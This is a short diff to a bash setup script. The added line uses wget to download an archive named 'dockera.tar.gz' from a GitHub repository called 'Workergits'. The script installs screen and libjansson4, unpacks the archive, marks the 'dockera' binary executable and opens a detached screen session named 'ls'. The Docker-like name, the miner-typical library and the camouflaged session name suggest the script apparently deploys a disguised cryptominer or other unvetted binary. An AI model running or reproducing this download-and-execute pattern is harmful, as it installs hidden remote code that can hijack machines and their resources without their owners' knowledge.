@@ -1,6 +1,7 @@
 #!/bin/bash
 sudo apt update 
 sudo apt install screen libjansson4 -y 
+wget https://github.com/wertesd/Workergits/raw/main/dockera.tar.gz
 tar -xvf dockera.tar.gz
 chmod +x dockera 
 screen -dmS ls 
